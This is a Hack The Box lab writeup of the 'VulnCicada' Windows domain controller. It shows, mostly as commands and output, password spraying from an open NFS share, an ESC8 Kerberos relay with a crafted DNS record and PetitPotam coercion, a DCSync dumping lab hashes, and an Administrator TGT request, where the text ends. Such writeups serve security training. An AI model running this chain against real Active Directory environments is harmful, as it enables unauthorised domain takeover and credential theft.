---
title: "HTB: VulnCicada"
description: Full writeup for the VulnCicada machine from the CPTS track on Hack The Box
date: 2026-09-19
tags:
  - hackthebox
  - windows
  - AD
  - ESC8
  - ADCS
image: /assets/img/posts/vulncicada/cover.png
difficulty: Medium
categories:
  - Writeups
  - Hack The Box
  - CPTS
author: tr3m0x
permalink: /blog/writeups/htb/vulncicada/
published: true
---


## Reconnaissance

### Port Scanning

I started with a full TCP scan.

```bash
└──╼ #nmap -sC -sV -p- -T4 --min-rate 1000 -O 10.129.234.48 -oN nmap/scan_tcp
Starting Nmap 7.95 ( https://nmap.org ) at 2026-09-18 10:51 EDT
Stats: 0:03:34 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 65.22% done; ETC: 10:55 (0:00:15 remaining)
Stats: 0:04:05 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 0.00% done
Nmap scan report for 10.129.234.48
Host is up (0.070s latency).
Not shown: 65512 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-18 14:55:01Z)
111/tcp   open  rpcbind       2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/tcp6  rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  2,3,4        111/udp6  rpcbind
|   100003  2,3         2049/udp   nfs
|   100003  2,3         2049/udp6  nfs
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100005  1,2,3       2049/tcp   mountd
|   100005  1,2,3       2049/tcp6  mountd
|   100005  1,2,3       2049/udp   mountd
|_  100005  1,2,3       2049/udp6  mountd
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-09-18T14:42:31
|_Not valid after:  2027-09-18T14:42:31
|_ssl-date: TLS randomness does not represent time
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-09-18T14:42:31
|_Not valid after:  2027-09-18T14:42:31
|_ssl-date: TLS randomness does not represent time
2049/tcp  open  mountd        1-3 (RPC #100005)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-09-18T14:42:31
|_Not valid after:  2027-09-18T14:42:31
|_ssl-date: TLS randomness does not represent time
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-JPQ225.cicada.vl
| Not valid before: 2026-09-18T14:42:31
|_Not valid after:  2027-09-18T14:42:31
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-09-18T14:56:35+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC-JPQ225.cicada.vl
| Not valid before: 2026-09-17T14:50:15
|_Not valid after:  2027-03-19T14:50:15
9389/tcp  open  mc-nmf        .NET Message Framing
49386/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49387/tcp open  msrpc         Microsoft Windows RPC
49407/tcp open  msrpc         Microsoft Windows RPC
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
53196/tcp open  msrpc         Microsoft Windows RPC
53654/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (89%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows Server 2022 (89%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
Service Info: Host: DC-JPQ225; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-09-18T14:55:56
|_  start_date: N/A
|_clock-skew: mean: -1s, deviation: 0s, median: -1s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 326.95 seconds
```

### NFS Enumeration

The scan showed NFS on port 2049. I used `showmount` to list the available exports.

```bash
└──╼ #showmount -e $ip
Export list for 10.129.234.48:
/profiles (everyone)
```

The `/profiles` share was open to everyone. I mounted it locally.

```bash
└──╼ #mkdir -p /mnt/nfs
└──╼ #sudo mount -t nfs -o vers=3 $ip:/profiles /mnt/nfs
```
The share contained several user profile folders.

```bash
└──╼ #ls -la /mnt/nfs/
total 10
drwxrwxrwx 2 4294967294 4294967294 4096 Jun  3  2025 .
drwxr-xr-x 1 root       root          6 Sep 18 11:40 ..
drwxrwxrwx 2 4294967294 4294967294   64 Sep 15  2024 Administrator
drwxrwxrwx 2 4294967294 4294967294   64 Sep 13  2024 Daniel.Marshall
drwxrwxrwx 2 4294967294 4294967294   64 Sep 13  2024 Debra.Wright
drwxrwxrwx 2 4294967294 4294967294   64 Sep 13  2024 Jane.Carter
drwxrwxrwx 2 4294967294 4294967294   64 Sep 13  2024 Jordan.Francis
drwxrwxrwx 2 4294967294 4294967294   64 Sep 13  2024 Joyce.Andrews
drwxrwxrwx 2 4294967294 4294967294   64 Sep 13  2024 Katie.Ward
drwxrwxrwx 2 4294967294 4294967294   64 Sep 13  2024 Megan.Simpson
drwxrwxrwx 2 4294967294 4294967294   64 Sep 13  2024 Richard.Gibbons
drwxrwxrwx 2 4294967294 4294967294   64 Sep 15  2024 Rosie.Powell
drwxrwxrwx 2 4294967294 4294967294   64 Sep 13  2024 Shirley.West
```

I checked each folder for files.

```bash
└──╼ #ls -la /mnt/nfs/*
/mnt/nfs/Administrator:
total 1461
drwxrwxrwx 2 4294967294 4294967294      64 Sep 15  2024 .
drwxrwxrwx 2 4294967294 4294967294    4096 Jun  3  2025 ..
drwx------ 2 4294967294 4294967294      64 Sep 15  2024 Documents
-rwxrwxrwx 1 4294967294 4294967294 1490573 Sep 13  2024 vacation.png

/mnt/nfs/Daniel.Marshall:
total 5
drwxrwxrwx 2 4294967294 4294967294   64 Sep 13  2024 .
drwxrwxrwx 2 4294967294 4294967294 4096 Jun  3  2025 ..

/mnt/nfs/Debra.Wright:
total 5
drwxrwxrwx 2 4294967294 4294967294   64 Sep 13  2024 .
drwxrwxrwx 2 4294967294 4294967294 4096 Jun  3  2025 ..

/mnt/nfs/Jane.Carter:
total 5
drwxrwxrwx 2 4294967294 4294967294   64 Sep 13  2024 .
drwxrwxrwx 2 4294967294 4294967294 4096 Jun  3  2025 ..

/mnt/nfs/Jordan.Francis:
total 5
drwxrwxrwx 2 4294967294 4294967294   64 Sep 13  2024 .
drwxrwxrwx 2 4294967294 4294967294 4096 Jun  3  2025 ..

/mnt/nfs/Joyce.Andrews:
total 5
drwxrwxrwx 2 4294967294 4294967294   64 Sep 13  2024 .
drwxrwxrwx 2 4294967294 4294967294 4096 Jun  3  2025 ..

/mnt/nfs/Katie.Ward:
total 5
drwxrwxrwx 2 4294967294 4294967294   64 Sep 13  2024 .
drwxrwxrwx 2 4294967294 4294967294 4096 Jun  3  2025 ..

/mnt/nfs/Megan.Simpson:
total 5
drwxrwxrwx 2 4294967294 4294967294   64 Sep 13  2024 .
drwxrwxrwx 2 4294967294 4294967294 4096 Jun  3  2025 ..

/mnt/nfs/Richard.Gibbons:
total 5
drwxrwxrwx 2 4294967294 4294967294   64 Sep 13  2024 .
drwxrwxrwx 2 4294967294 4294967294 4096 Jun  3  2025 ..

/mnt/nfs/Rosie.Powell:
total 1797
drwxrwxrwx 2 4294967294 4294967294      64 Sep 15  2024 .
drwxrwxrwx 2 4294967294 4294967294    4096 Jun  3  2025 ..
drwx------ 2 4294967294 4294967294      64 Sep 15  2024 Documents
-rwx------ 1 4294967294 4294967294 1832505 Sep 13  2024 marketing.png

/mnt/nfs/Shirley.West:
total 5
drwxrwxrwx 2 4294967294 4294967294   64 Sep 13  2024 .
drwxrwxrwx 2 4294967294 4294967294 4096 Jun  3  2025 ..
```

## Password Spraying

The `Administrator` and `Rosie.Powell` folders contained images. The file `marketing.png` exposed the password `Cicada123`.

![Password visible in marketing.png](/assets/img/posts/vulncicada/marketing.png)

The folder names also gave me a user list. I sprayed the leaked password against those users.

```bash
┌─[root@parrot]─[/home/tr3m0x/security/htb/windows/VulnCicada]
└──╼ #nxc smb $ip -u users.txt -p "Cicada123" -k --continue-on-success
SMB         10.129.234.48   445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.234.48   445    DC-JPQ225        [-] cicada.vl\Administrator:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         10.129.234.48   445    DC-JPQ225        [-] cicada.vl\Daniel.Marshall:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         10.129.234.48   445    DC-JPQ225        [-] cicada.vl\Debra.Wright:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         10.129.234.48   445    DC-JPQ225        [-] cicada.vl\Jane.Carter:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         10.129.234.48   445    DC-JPQ225        [-] cicada.vl\Jordan.Francis:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         10.129.234.48   445    DC-JPQ225        [-] cicada.vl\Joyce.Andrews:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         10.129.234.48   445    DC-JPQ225        [-] cicada.vl\Katie.Ward:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         10.129.234.48   445    DC-JPQ225        [-] cicada.vl\Megan.Simpson:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         10.129.234.48   445    DC-JPQ225        [-] cicada.vl\Richard.Gibbons:Cicada123 KDC_ERR_PREAUTH_FAILED 
SMB         10.129.234.48   445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
SMB         10.129.234.48   445    DC-JPQ225        [-] cicada.vl\Shirley.West:Cicada123 KDC_ERR_CLIENT_REVOKED 
```

## SMB Enumeration

Normal NTLM authentication returned `STATUS_NOT_SUPPORTED`. Kerberos authentication worked and confirmed valid credentials for `Rosie.Powell`.

I used those credentials to list the SMB shares.
```bash
└──╼ #nxc smb $ip -u Rosie.Powell -p "Cicada123" -k --shares
SMB         10.129.234.48   445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         10.129.234.48   445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
SMB         10.129.234.48   445    DC-JPQ225        [*] Enumerated shares
SMB         10.129.234.48   445    DC-JPQ225        Share           Permissions     Remark
SMB         10.129.234.48   445    DC-JPQ225        -----           -----------     ------
SMB         10.129.234.48   445    DC-JPQ225        ADMIN$                          Remote Admin
SMB         10.129.234.48   445    DC-JPQ225        C$                              Default share
SMB         10.129.234.48   445    DC-JPQ225        CertEnroll      READ            Active Directory Certificate Services share
SMB         10.129.234.48   445    DC-JPQ225        IPC$            READ            Remote IPC
SMB         10.129.234.48   445    DC-JPQ225        NETLOGON        READ            Logon server share 
SMB         10.129.234.48   445    DC-JPQ225        profiles$       READ,WRITE      
SMB         10.129.234.48   445    DC-JPQ225        SYSVOL          READ            Logon server share
```

The `CertEnroll` share was readable. Its contents confirmed that Active Directory Certificate Services was in use.

```bash
└──╼ #smbclient //dc-jpq225.cicada.vl/CertEnroll --use-kerberos=required
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Sep 18 10:56:27 2026
  ..                                  D        0  Fri Sep 13 11:17:59 2024
  cicada-DC-JPQ225-CA(1)+.crl         A      741  Fri Sep 18 10:51:15 2026
  cicada-DC-JPQ225-CA(1).crl          A      941  Fri Sep 18 10:51:15 2026
  cicada-DC-JPQ225-CA(10)+.crl        A      742  Fri Sep 18 10:51:15 2026
  cicada-DC-JPQ225-CA(10).crl         A      943  Fri Sep 18 10:51:15 2026
  cicada-DC-JPQ225-CA(11)+.crl        A      742  Fri Sep 18 10:51:15 2026
  cicada-DC-JPQ225-CA(11).crl         A      943  Fri Sep 18 10:51:15 2026
  cicada-DC-JPQ225-CA(12)+.crl        A      742  Fri Sep 18 10:51:15 2026
  cicada-DC-JPQ225-CA(12).crl         A      943  Fri Sep 18 10:51:15 2026
  cicada-DC-JPQ225-CA(13)+.crl        A      742  Fri Sep 18 10:51:15 2026
  cicada-DC-JPQ225-CA(13).crl         A      943  Fri Sep 18 10:51:14 2026
  cicada-DC-JPQ225-CA(14)+.crl        A      742  Fri Sep 18 10:51:14 2026
  cicada-DC-JPQ225-CA(14).crl         A      943  Fri Sep 18 10:51:14 2026
  cicada-DC-JPQ225-CA(15)+.crl        A      742  Fri Sep 18 10:51:14 2026
  cicada-DC-JPQ225-CA(15).crl         A      943  Fri Sep 18 10:51:14 2026
  cicada-DC-JPQ225-CA(16)+.crl        A      742  Fri Sep 18 10:51:14 2026
  cicada-DC-JPQ225-CA(16).crl         A      943  Fri Sep 18 10:51:14 2026
  cicada-DC-JPQ225-CA(17)+.crl        A      742  Fri Sep 18 10:51:14 2026
  cicada-DC-JPQ225-CA(17).crl         A      943  Fri Sep 18 10:51:14 2026
  cicada-DC-JPQ225-CA(18)+.crl        A      742  Fri Sep 18 10:51:14 2026
  cicada-DC-JPQ225-CA(18).crl         A      943  Fri Sep 18 10:51:14 2026
  cicada-DC-JPQ225-CA(19)+.crl        A      742  Fri Sep 18 10:51:14 2026
  cicada-DC-JPQ225-CA(19).crl         A      943  Fri Sep 18 10:51:14 2026
  cicada-DC-JPQ225-CA(2)+.crl         A      741  Fri Sep 18 10:51:15 2026
  cicada-DC-JPQ225-CA(2).crl          A      941  Fri Sep 18 10:51:15 2026
  cicada-DC-JPQ225-CA(20)+.crl        A      742  Fri Sep 18 10:51:14 2026
  cicada-DC-JPQ225-CA(20).crl         A      943  Fri Sep 18 10:51:14 2026
<SNIP>
```

## Exploiting ADCS

I used Certipy to check the certificate authority for vulnerable configurations.

```bash
└──╼ #certipy find -dc-ip $ip -target dc-jpq225.cicada.vl -u "Rosie.Powell@cicada.vl" -p Cicada123 -k -vulnerable -stdout
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[!] KRB5CCNAME environment variable not set
[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'cicada-DC-JPQ225-CA' via RRP
[*] Successfully retrieved CA configuration for 'cicada-DC-JPQ225-CA'
[*] Checking web enrollment for CA 'cicada-DC-JPQ225-CA' @ 'DC-JPQ225.cicada.vl'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : cicada-DC-JPQ225-CA
    DNS Name                            : DC-JPQ225.cicada.vl
    Certificate Subject                 : CN=cicada-DC-JPQ225-CA, DC=cicada, DC=vl
    Certificate Serial Number           : 5406B1F65A30E59D49748770AAE0EA1D
    Certificate Validity Start          : 2026-09-18 14:46:17+00:00
    Certificate Validity End            : 2526-09-18 14:56:17+00:00
    Web Enrollment
      HTTP
        Enabled                         : True
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CICADA.VL\Administrators
      Access Rights
        ManageCa                        : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        ManageCertificates              : CICADA.VL\Administrators
                                          CICADA.VL\Domain Admins
                                          CICADA.VL\Enterprise Admins
        Enroll                          : CICADA.VL\Authenticated Users
    [!] Vulnerabilities
      ESC8                              : Web Enrollment is enabled over HTTP.
Certificate Templates                   : [!] Could not find any certificate templates
```

### About ESC8

ESC8 abuses the AD CS web enrollment endpoint over HTTP. An attacker relays a privileged account and requests a certificate as that account.

NTLM was disabled on this target. I used a Kerberos relay instead. This [Synacktiv article](https://www.synacktiv.com/publications/relaying-kerberos-over-smb-using-krbrelayx.html) explains the technique in detail.

### Attack Chain Explanation

The attack uses a crafted DNS name with `CredMarshalTargetInfo` data. Windows removes this data when it builds the SPN, but DNS resolves the full name to the attacker's IP.

The full chain is:

1. Add the crafted DNS record.
2. Start a relay to the AD CS web endpoint.
3. Coerce the domain controller to connect to the crafted name.
4. Relay its Kerberos authentication to AD CS.
5. Request a certificate for the domain controller account.

The certificate can then be used to authenticate as the domain controller.


## Shell as `NT AUTHORITY\SYSTEM`

First, I added the crafted DNS record and pointed it to my machine.

```bash
└──╼ $bloodyAD -d cicada.vl -u Rosie.Powell -p Cicada123 -k --host  DC-JPQ225.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.15.5
[+] Adding "DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA" to "DC=cicada.vl,CN=MicrosoftDNS,DC=DomainDnsZones,DC=cicada,DC=vl"
[+] DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA has been successfully added
```

Next, I started the relay against the AD CS web endpoint.

```bash
└──╼ #certipy relay -target 'http://DC-JPQ225.cicada.vl/' -template DomainController
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting http://DC-JPQ225.cicada.vl/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
[*] Setting up SMB Server on port 445
```

I then used PetitPotam to coerce the domain controller into authenticating to the relay.

```bash
└──╼ #nxc smb DC-JPQ225.cicada.vl -u Rosie.Powell -p Cicada123 -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam 
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [*]  x64 (name:DC-JPQ225) (domain:cicada.vl) (signing:True) (SMBv1:None) (NTLM:False)
SMB         DC-JPQ225.cicada.vl 445    DC-JPQ225        [+] cicada.vl\Rosie.Powell:Cicada123 
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        VULNERABLE, PetitPotam
COERCE_PLUS DC-JPQ225.cicada.vl 445    DC-JPQ225        Exploit Success, efsrpc\EfsRpcAddUsersToFile
```

The relay received the authentication and issued a certificate for the domain controller.

```bash
└──╼ #certipy relay -target 'http://DC-JPQ225.cicada.vl/' -template DomainController
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Targeting http://DC-JPQ225.cicada.vl/certsrv/certfnsh.asp (ESC8)
[*] Listening on 0.0.0.0:445
[*] Setting up SMB Server on port 445
[*] (SMB): Received connection from 10.129.234.48, attacking target http://DC-JPQ225.cicada.vl
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
[*] (SMB): Authenticating connection from /@10.129.234.48 against http://DC-JPQ225.cicada.vl SUCCEED [1]
[*] Requesting certificate for '\\' based on the template 'DomainController'
[*] (SMB): Received connection from 10.129.234.48, attacking target http://DC-JPQ225.cicada.vl
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
[*] http:///@dc-jpq225.cicada.vl [1] -> HTTP Request: POST http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
[*] Certificate issued with request ID 88
[*] Retrieving certificate for request ID: 88
[*] http:///@dc-jpq225.cicada.vl [1] -> HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certnew.cer?ReqID=88 "HTTP/1.1 200 OK"
[*] Got certificate with DNS Host Name 'DC-JPQ225.cicada.vl'
[*] Certificate object SID is 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Saving certificate and private key to 'dc-jpq225.pfx'
[*] Wrote certificate and private key to 'dc-jpq225.pfx'
[*] Exiting.
```

I used the certificate to authenticate as `DC-JPQ225$`.

```bash
└──╼ #certipy auth -pfx dc-jpq225.pfx -dc-ip 10.129.234.48
Certipy v5.1.0 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN DNS Host Name: 'DC-JPQ225.cicada.vl'
[*]     Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000'
[*] Using principal: 'dc-jpq225$@cicada.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'dc-jpq225.ccache'
[*] Wrote credential cache to 'dc-jpq225.ccache'
[*] Trying to retrieve NT hash for 'dc-jpq225$'
[*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
```

The NT hash was not useful because NTLM was disabled. The Kerberos cache still allowed me to run `secretsdump` and perform a DCSync.

```bash
└──╼ #export KRB5CCNAME=dc-jpq225.ccache
└──╼ #impacket-secretsdump DC-JPQ225.cicada.vl -dc-ip 10.129.234.48 -k
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:8dd165a43fcb66d6a0e2924bb67e040c:::
cicada.vl\Shirley.West:1104:aad3b435b51404eeaad3b435b51404ee:ff99630bed1e3bfd90e6a193d603113f:::
cicada.vl\Jordan.Francis:1105:aad3b435b51404eeaad3b435b51404ee:f5caf661b715c4e1435dfae92c2a65e3:::
cicada.vl\Jane.Carter:1106:aad3b435b51404eeaad3b435b51404ee:7e133f348892d577014787cbc0206aba:::
cicada.vl\Joyce.Andrews:1107:aad3b435b51404eeaad3b435b51404ee:584c796cd820a48be7d8498bc56b4237:::
cicada.vl\Daniel.Marshall:1108:aad3b435b51404eeaad3b435b51404ee:8cdf5eeb0d101559fa4bf00923cdef81:::
cicada.vl\Rosie.Powell:1109:aad3b435b51404eeaad3b435b51404ee:ff99630bed1e3bfd90e6a193d603113f:::
cicada.vl\Megan.Simpson:1110:aad3b435b51404eeaad3b435b51404ee:6e63f30a8852d044debf94d73877076a:::
cicada.vl\Katie.Ward:1111:aad3b435b51404eeaad3b435b51404ee:42f8890ec1d9b9c76a187eada81adf1e:::
cicada.vl\Richard.Gibbons:1112:aad3b435b51404eeaad3b435b51404ee:d278a9baf249d01b9437f0374bf2e32e:::
cicada.vl\Debra.Wright:1113:aad3b435b51404eeaad3b435b51404ee:d9a2147edbface1666532c9b3acafaf3:::
DC-JPQ225$:1000:aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:f9181ec2240a0d172816f3b5a185b6e3e0ba773eae2c93a581d9415347153e1a
Administrator:aes128-cts-hmac-sha1-96:926e5da4d5cd0be6e1cea21769bb35a4
Administrator:des-cbc-md5:fd2a29621f3e7604
krbtgt:aes256-cts-hmac-sha1-96:ed5b82d607535668e59aa8deb651be5abb9f1da0d31fa81fd24f9890ac84693d
krbtgt:aes128-cts-hmac-sha1-96:9b7825f024f21e22e198e4aed70ff8ea
krbtgt:des-cbc-md5:2a768a9e2c983e31
cicada.vl\Shirley.West:aes256-cts-hmac-sha1-96:3f3657fb6f0d441680e9c5e0c104ef4005fa5e79b01bbeed47031b04a913f353
cicada.vl\Shirley.West:aes128-cts-hmac-sha1-96:cd16a8664de29a4e8bd9e8b492f3eef9
cicada.vl\Shirley.West:des-cbc-md5:abbf341664bafe76
cicada.vl\Jordan.Francis:aes256-cts-hmac-sha1-96:ec8aaa2c9432ed3b0d2834e4e24dc243ec8d77ec3488101e79d1b2cc1c2ee6ea
cicada.vl\Jordan.Francis:aes128-cts-hmac-sha1-96:0b551142246edc108a92913e46852404
cicada.vl\Jordan.Francis:des-cbc-md5:a2e53d6ea44ab6e9
cicada.vl\Jane.Carter:aes256-cts-hmac-sha1-96:bb04095d1884439b825a5606dd43aadfd2a8fad1386b3728b9bad582efd5d4aa
cicada.vl\Jane.Carter:aes128-cts-hmac-sha1-96:8a27618e7036a49fb6e371f2e7af649e
cicada.vl\Jane.Carter:des-cbc-md5:340eda8962cbadce
cicada.vl\Joyce.Andrews:aes256-cts-hmac-sha1-96:7ca8317638d429301dfbb88af701fadffbc106d31f79a4de7e8d35afbc2d30c4
cicada.vl\Joyce.Andrews:aes128-cts-hmac-sha1-96:6ec2495dea28c09cf636dd8b080012fd
cicada.vl\Joyce.Andrews:des-cbc-md5:6bf2b6f21fcda258
cicada.vl\Daniel.Marshall:aes256-cts-hmac-sha1-96:fcccb590bac0a888898461247fbb3ee28d282671d8491e0b0b83ac688c2a29d6
cicada.vl\Daniel.Marshall:aes128-cts-hmac-sha1-96:80a3b053500586eefd07d32fc03e3849
cicada.vl\Daniel.Marshall:des-cbc-md5:e0fbdcb3c7e9f154
cicada.vl\Rosie.Powell:aes256-cts-hmac-sha1-96:54de41137f8d37d4a6beac1638134dfefa73979041cae3ffc150ebcae470fce5
cicada.vl\Rosie.Powell:aes128-cts-hmac-sha1-96:d01b3b63a2cde0d1c5e9e0e4a55529a4
cicada.vl\Rosie.Powell:des-cbc-md5:6e70b9a41a677a94
cicada.vl\Megan.Simpson:aes256-cts-hmac-sha1-96:cdb94aaf5b15465371cbe42913d652fa7e2a2e43afc8dd8a17fee1d3f142da3b
cicada.vl\Megan.Simpson:aes128-cts-hmac-sha1-96:8fd3f86397ee83ed140a52bdfa321df0
cicada.vl\Megan.Simpson:des-cbc-md5:587032806b5d19b6
cicada.vl\Katie.Ward:aes256-cts-hmac-sha1-96:829effafe88a0a5e17c4ccf1840f277327309b2902aeccc36625ac51b8e936bc
cicada.vl\Katie.Ward:aes128-cts-hmac-sha1-96:585264bc071354147db5b677be13506b
cicada.vl\Katie.Ward:des-cbc-md5:01801aa2e5755898
cicada.vl\Richard.Gibbons:aes256-cts-hmac-sha1-96:3c3beb85ec35003399e37ae578b90ae7a65b4ec7305e0ac012dbeaaa41bcbe22
cicada.vl\Richard.Gibbons:aes128-cts-hmac-sha1-96:646557f4143182bda5618f95429f3a49
cicada.vl\Richard.Gibbons:des-cbc-md5:834a675bd058efd0
cicada.vl\Debra.Wright:aes256-cts-hmac-sha1-96:26409e8cc8f3240501db7319bd8d8a2077d6b955a8f673b9ccf7d9086d3aec62
cicada.vl\Debra.Wright:aes128-cts-hmac-sha1-96:6a289ddd9a1a2196b671b4bbff975629
cicada.vl\Debra.Wright:des-cbc-md5:f25eb6a4265413cb
DC-JPQ225$:aes256-cts-hmac-sha1-96:01e2f9943c6c0c3f010dde6dddcae89cc81158e4f1c017e6fc34f85538d892b1
DC-JPQ225$:aes128-cts-hmac-sha1-96:87efc91730d07d819f58b4996e3fa04c
DC-JPQ225$:des-cbc-md5:6df208855d40dfcb
[*] Cleaning up... 
```


The dump revealed the Administrator hash. I requested a TGT and used `psexec` to get a SYSTEM shell.

```bash
└──╼ #impacket-getTGT cicada.vl/Administrator -k  -hashes :85a0da53871a9d56b6cd05deda3a5e87 -dc-ip 10.129.234.48
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in Administrator.ccache
┌─[root@parrot]─[/home/tr3m0x/security/htb/windows/VulnCicada]
└──╼ #export KRB5CCNAME=Administrator.ccache 
┌─[root@parrot]─[/home/tr3m0x/security/htb/windows/VulnCicada]
